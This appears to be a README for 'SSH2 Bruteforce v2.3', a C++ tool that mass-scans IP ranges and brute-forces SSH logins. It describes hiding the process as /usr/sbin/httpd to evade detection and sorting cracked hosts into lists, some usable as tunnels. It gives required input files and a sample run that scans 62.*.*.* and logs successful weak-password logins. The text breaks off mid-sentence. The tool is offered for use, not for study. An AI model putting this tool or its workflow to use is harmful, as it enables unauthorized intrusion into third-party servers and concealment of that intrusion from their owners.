It is written in C++, therefore it is compatible on a large scale of unix systems, both 32 and 64 bits.\r\n\r\nCompatible on 32 and 64 bit sistem on a various systems\r\nFast and reliable\r\nEasy to use\r\nUsing fork() hidden process (will appear as /usr/sbin/httpd instead of bssh2 in `ps aux` command)\r\nMaking differance between linux sistems and NON-BASH systems\r\nThe script will run and eventually catch two type of ssh2 connections :\r\n\r\nNOBASH (nobash.txt) -> systems that canâ€™t support basic and common SSH2 commands, but can still be used as a sshtunnel (some of them)\r\nLINUX (vuln.txt) -> systems that can support basic and common SSH2 commands\r\n \r\n\r\nBefore the scan start you must provide 2 files :\r\nscan.log (ips line by line)\r\n\r\n* 1.2.3.4\r\n* 4.4.4.4\r\n* 5.5.5.5\r\n\r\n\r\npass.txt\r\n\r\n* user1 pass1\r\n* user2 pass2\r\n* anotheruser anotherpass\r\n\r\nATTENTION:\r\nScan from uid0 servers:\r\n\r\n\r\n* ./scan_root 62\r\n* scanning network 62.*.*.*\r\n* usec: 100, burst packets 50\r\n* using \"(tcp[tcpflags]=0x12) and (src port 22) and (dst port 46222)\" as pcap filter\r\n* my detected ip on eth0 is 1*7.**.2**.3\r\n* capturing process started pid 27055\r\n* scanning 62.0.0.*\r\n* scanning 62.0.1.*\r\n* .......\r\n* @SSH2 Bruteforce v2.3 @ 2015!\r\n* -> by lan.tester@yahoo.com\r\n* -> E-mail us for support or if you want to make a donation !\r\n* Login successful!\r\n* Vipcode is OK\r\n* nobash -> aaron aaron 62.*.*.* 22\r\n* nobash -> account account 62.*.*.* 22\r\n* nobash -> account account 62.*.*.* 22\r\n\r\nScan from normal user (not uid0):\r\n1.
